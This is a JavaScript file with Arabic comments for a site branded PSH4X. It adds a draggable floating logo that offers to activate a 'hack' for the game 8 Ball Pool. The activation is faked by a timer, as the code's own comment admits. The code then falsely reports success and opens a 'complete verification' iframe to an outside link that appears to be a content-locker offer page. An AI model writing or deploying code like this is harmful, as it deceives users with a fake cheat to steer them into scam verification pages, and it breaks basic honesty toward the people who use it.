// وظائف الشعار العائم

// متغيرات عالمية للتحكم في السحب
let isDragging = false;
let offsetX = 0;
let offsetY = 0;
let startX = 0;
let startY = 0;
let hasMoved = false;

// تهيئة الشعار العائم عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', function() {
    // التحقق من حالة الشعار العائم في localStorage
    const isLogoVisible = localStorage.getItem('psh4x_floating_logo_visible') === 'true';
    // التحقق من حالة تسجيل الدخول والحساب المدفوع
    const isLoggedIn = localStorage.getItem('psh4x_logged_in') === 'true';
    const isPremium = localStorage.getItem('psh4x_premium') === 'true';
    const isAppClosed = localStorage.getItem('psh4x_app_closed') === 'true';
    
    // إظهار الشعار العائم فقط إذا كان مرئيًا وتم تسجيل الدخول بحساب مدفوع ولم يتم إغلاق التطبيق
    if (isLogoVisible && isLoggedIn && isPremium && !isAppClosed) {
        // إظهار الشعار العائم بالموقع المحفوظ
        setTimeout(() => {
            restoreFloatingLogo();
        }, 500); // تأخير للتأكد من تحميل الصفحة بالكامل
    } else {
        // إخفاء الشعار العائم
        hideFloatingLogo();
    }
    
    // إزالة علامة إغلاق التطبيق عند تحميل الصفحة
    localStorage.removeItem('psh4x_app_closed');
});

// إضافة مستمع لحدث إغلاق النافذة لتسجيل حالة الإغلاق
window.addEventListener('beforeunload', function() {
    localStorage.setItem('psh4x_app_closed', 'true');
});

// إضافة مستمع للتغييرات في حالة الحساب المدفوع
window.addEventListener('premium_status_changed', function(event) {
    const isPremium = event.detail.isPremium;
    if (!isPremium) {
        // إخفاء الشعار العائم عند الخروج من الحساب المدفوع
        hideFloatingLogo();
    }
});

// إضافة مستمع للتغييرات في حالة تسجيل الدخول
window.addEventListener('login_status_changed', function(event) {
    const isLoggedIn = event.detail.isLoggedIn;
    if (!isLoggedIn) {
        // إخفاء الشعار العائم عند تسجيل الخروج
        hideFloatingLogo();
    }
});

// إنشاء الشعار العائم في DOM
function createFloatingLogo() {
    // التحقق من وجود الشعار العائم مسبقًا
    if (document.querySelector('.floating-logo-container')) {
        return;
    }
    
    // إنشاء حاوية الشعار العائم
    const container = document.createElement('div');
    container.className = 'floating-logo-container';
    
    // إنشاء عنصر الصورة
    const logo = document.createElement('img');
    logo.className = 'floating-logo';
    logo.src = 'images/logo-f.png';
    logo.alt = 'PSH4X Logo';
    logo.style.cursor = 'pointer'; // تغيير شكل المؤشر عند المرور فوق الشعار
    
    // إضافة العناصر إلى الحاوية
    container.appendChild(logo);
    
    // إضافة الحاوية إلى الصفحة
    document.body.appendChild(container);
    
    // إضافة مستمعات الأحداث للسحب
    setupDragEvents(container);
    
            // تغيير شكل المؤشر للإشارة إلى أنه يمكن النقر عليه
    container.style.cursor = 'pointer';
    
    // إظهار الشعار بتأثير متحرك
    setTimeout(() => {
        container.style.display = 'block';
    }, 100);
    
    return container;
}

// إعداد أحداث السحب للشعار العائم
function setupDragEvents(element) {
    // بدء السحب
    element.addEventListener('mousedown', function(e) {
        // تسجيل موقع بداية النقر
        startX = e.clientX;
        startY = e.clientY;
        hasMoved = false;
        
        isDragging = true;
        offsetX = e.clientX - element.getBoundingClientRect().left;
        offsetY = e.clientY - element.getBoundingClientRect().top;
        element.classList.add('dragging');
    });
    
    // السحب
    document.addEventListener('mousemove', function(e) {
        if (!isDragging) return;
        
        // التحقق مما إذا كان المستخدم يسحب أو ينقر فقط
        const moveX = Math.abs(e.clientX - startX);
        const moveY = Math.abs(e.clientY - startY);
        
        // إذا تحرك المؤشر أكثر من 5 بكسل، فهو يسحب
        if (moveX > 5 || moveY > 5) {
            hasMoved = true;
        }
        
        // حساب الموقع الجديد
        let newX = e.clientX - offsetX;
        let newY = e.clientY - offsetY;
        
        // التأكد من بقاء الشعار داخل حدود النافذة
        const maxX = window.innerWidth - element.offsetWidth;
        const maxY = window.innerHeight - element.offsetHeight;
        
        newX = Math.max(0, Math.min(newX, maxX));
        newY = Math.max(0, Math.min(newY, maxY));
        
        // تعيين الموقع الجديد
        element.style.left = newX + 'px';
        element.style.top = newY + 'px';
    });
    
    // إنهاء السحب
    document.addEventListener('mouseup', function(e) {
        if (isDragging) {
            isDragging = false;
            element.classList.remove('dragging');
            
            // حفظ موقع الشعار العائم بعد السحب
            const rect = element.getBoundingClientRect();
            saveFloatingLogoState(true, rect.left, rect.top);
            
            // إذا لم يتحرك المستخدم كثيرًا، فهو نقر وليس سحب
            if (!hasMoved) {
                console.log('تم النقر على الشعار');
                showBallPoolHackConfirmation();
            }
        }
    });
    
    // منع السلوك الافتراضي للسحب
    element.addEventListener('dragstart', function(e) {
        e.preventDefault();
    });
}

// إظهار الشعار العائم
function showFloatingLogo() {
    let container = document.querySelector('.floating-logo-container');
    
    if (!container) {
        container = createFloatingLogo();
    } else {
        container.style.display = 'block';
    }
    
    // تحريك الشعار إلى موقع عشوائي على الشاشة
    const maxX = window.innerWidth - 150;
    const maxY = window.innerHeight - 150;
    
    const randomX = Math.floor(Math.random() * maxX);
    const randomY = Math.floor(Math.random() * maxY);
    
    container.style.left = randomX + 'px';
    container.style.top = randomY + 'px';
    
    // حفظ حالة الشعار العائم في localStorage
    saveFloatingLogoState(true, randomX, randomY);
}

// إخفاء الشعار العائم
function hideFloatingLogo() {
    const container = document.querySelector('.floating-logo-container');
    if (container) {
        container.style.display = 'none';
        
        // حفظ حالة الشعار العائم في localStorage
        saveFloatingLogoState(false);
    }
}

// حفظ حالة الشعار العائم في localStorage
function saveFloatingLogoState(isVisible, x = 0, y = 0) {
    localStorage.setItem('psh4x_floating_logo_visible', isVisible);
    
    if (isVisible) {
        localStorage.setItem('psh4x_floating_logo_x', x);
        localStorage.setItem('psh4x_floating_logo_y', y);
    }
}

// استعادة الشعار العائم من localStorage
function restoreFloatingLogo() {
    // التحقق من حالة الشعار العائم
    const isVisible = localStorage.getItem('psh4x_floating_logo_visible') === 'true';
    
    if (isVisible) {
        // إنشاء الشعار العائم إذا لم يكن موجودًا
        let container = document.querySelector('.floating-logo-container');
        
        if (!container) {
            container = createFloatingLogo();
        }
        
        // استعادة موقع الشعار العائم
        const x = parseInt(localStorage.getItem('psh4x_floating_logo_x') || '100');
        const y = parseInt(localStorage.getItem('psh4x_floating_logo_y') || '100');
        
        container.style.left = x + 'px';
        container.style.top = y + 'px';
        container.style.display = 'block';
    }
}

// التحقق من وجود وظيفة showNotification وتعريفها إذا لم تكن موجودة
if (typeof window.showNotification !== 'function') {
    window.showNotification = function(message, type = 'info') {
        // إنشاء عنصر الإشعار
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        
        // إضافة أيقونة حسب النوع
        let icon = 'info-circle';
        if (type === 'success') icon = 'check-circle';
        if (type === 'warning') icon = 'exclamation-triangle';
        if (type === 'error') icon = 'times-circle';
        
        notification.innerHTML = `
            <i class="fas fa-${icon}"></i>
            <span>${message}</span>
        `;
        
        // إضافة الإشعار إلى الصفحة
        document.body.appendChild(notification);
        
        // إظهار الإشعار بتأثير
        setTimeout(() => {
            notification.classList.add('show');
        }, 10);
        
        // إخفاء الإشعار بعد فترة
        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => {
                notification.remove();
            }, 300);
        }, 3000);
    };
}

// وظيفة عرض تنبيه تفعيل الهاك على لعبة 8 Ball Pool
function showBallPoolHackConfirmation() {
    console.log('جاري عرض تنبيه تفعيل الهاك'); // للتأكد من استدعاء الوظيفة
    
    // التحقق من حالة تفعيل النسخة المدفوعة
    const isPremium = localStorage.getItem('psh4x_premium') === 'true';
    const isLoggedIn = localStorage.getItem('psh4x_logged_in') === 'true';
    
    if (!isPremium || !isLoggedIn) {
        // إذا لم يكن المستخدم يملك نسخة مدفوعة
        window.showNotification('يجب تفعيل النسخة المدفوعة أولاً', 'error');
        return;
    }
    
    // إنشاء عنصر التنبيه
    const confirmationModal = document.createElement('div');
    confirmationModal.className = 'hack-confirmation-modal';
    confirmationModal.id = 'hackConfirmationModal';
    confirmationModal.innerHTML = `
        <div class="hack-confirmation-content">
            <h3>تفعيل الهاك على لعبة 8 Ball Pool</h3>
            <p>هل تريد الدخول للعبة 8 Ball Pool في وضع الهاك؟</p>
            <div class="hack-confirmation-buttons">
                <button id="confirm-hack-yes" class="hack-confirm-btn">نعم</button>
                <button id="confirm-hack-no" class="hack-cancel-btn">لا</button>
            </div>
        </div>
    `;
    
    // إضافة التنبيه إلى الصفحة
    document.body.appendChild(confirmationModal);
    
    // إظهار التنبيه بتأثير متحرك
    setTimeout(() => {
        confirmationModal.classList.add('show');
    }, 10);
    
    // إضافة مستمعات الأحداث للأزرار
    document.getElementById('confirm-hack-yes').addEventListener('click', function() {
        // إغلاق التنبيه
        confirmationModal.classList.remove('show');
        setTimeout(() => {
            document.body.removeChild(confirmationModal);
        }, 300);
        
        // بدء عملية التحقق وتفعيل الهاك على لعبة 8 Ball Pool
        activateBallPoolHack();
    });
    
    document.getElementById('confirm-hack-no').addEventListener('click', function() {
        // إغلاق التنبيه فقط
        confirmationModal.classList.remove('show');
        setTimeout(() => {
            document.body.removeChild(confirmationModal);
        }, 300);
    });
}

// وظيفة تفعيل الهاك على لعبة 8 Ball Pool
function activateBallPoolHack() {
    // إظهار إشعار ببدء عملية التحقق
    window.showNotification('جاري التحقق من تفعيل الهاك...', 'info', false);
    
    // محاكاة عملية التحقق والتفعيل
    setTimeout(() => {
        // إظهار إشعار بنجاح التفعيل مع تمكين النقر للتحقق
        window.showNotification('تم تفعيل الهاك على لعبة 8 Ball Pool - اضغط لإكمال التحقق', 'success', true);
        
        // حفظ حالة تفعيل الهاك على لعبة 8 Ball Pool في localStorage
        localStorage.setItem('psh4x_8ballpool_hack_active', 'true');
        
        // إظهار تنبيه إضافي يطلب من المستخدم إكمال التحقق
        setTimeout(() => {
            showVerificationPrompt();
        }, 1500);
    }, 3000);
}

// وظيفة عرض تنبيه إكمال التحقق للدخول للعبة
function showVerificationPrompt() {
    // إنشاء عنصر التنبيه
    const verificationModal = document.createElement('div');
    verificationModal.className = 'hack-confirmation-modal';
    verificationModal.id = 'verificationPromptModal';
    verificationModal.innerHTML = `
        <div class="hack-confirmation-content">
            <h3>إكمال التحقق</h3>
            <p>اكمل التحقق للدخول للعبة</p>
            <div class="hack-confirmation-buttons">
                <button id="complete-verification-btn" class="hack-confirm-btn">إكمال التحقق</button>
            </div>
        </div>
    `;
    
    // إضافة التنبيه إلى الصفحة
    document.body.appendChild(verificationModal);
    
    // إظهار التنبيه بتأثير متحرك
    setTimeout(() => {
        verificationModal.classList.add('show');
    }, 10);
    
    // إضافة مستمع الحدث لزر إكمال التحقق
    document.getElementById('complete-verification-btn').addEventListener('click', function() {
        // إغلاق التنبيه
        verificationModal.classList.remove('show');
        setTimeout(() => {
            document.body.removeChild(verificationModal);
            
            // إنشاء القائمة المنبثقة بمحتوى الرابط
            const verificationIframeModal = document.createElement('div');
            verificationIframeModal.className = 'hack-confirmation-modal';
            verificationIframeModal.id = 'verificationIframeModal';
            verificationIframeModal.innerHTML = `
                <div class="hack-confirmation-content" style="width: 90%; max-width: 800px; height: 80vh; max-height: 600px;">
                    <h3>إكمال التحقق</h3>
                    <div style="position: relative; height: calc(100% - 60px); width: 100%;">
                        <iframe src="https://billiardprox1.online/cl/i/wovwmj" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none;"></iframe>
                    </div>
                    <div class="hack-confirmation-buttons">
                        <button id="close-verification-iframe" class="hack-cancel-btn">إغلاق</button>
                    </div>
                </div>
            `;
            
            // إضافة القائمة المنبثقة إلى الصفحة
            document.body.appendChild(verificationIframeModal);
            
            // إظهار القائمة المنبثقة بتأثير متحرك
            setTimeout(() => {
                verificationIframeModal.classList.add('show');
            }, 10);
            
            // إضافة مستمع الحدث لزر الإغلاق
            document.getElementById('close-verification-iframe').addEventListener('click', function() {
                verificationIframeModal.classList.remove('show');
                setTimeout(() => {
                    document.body.removeChild(verificationIframeModal);
                }, 300);
            });
        }, 300);
    });
}

// تصدير الوظائف
window.floatingLogo = {
    show: showFloatingLogo,
    hide: hideFloatingLogo
};
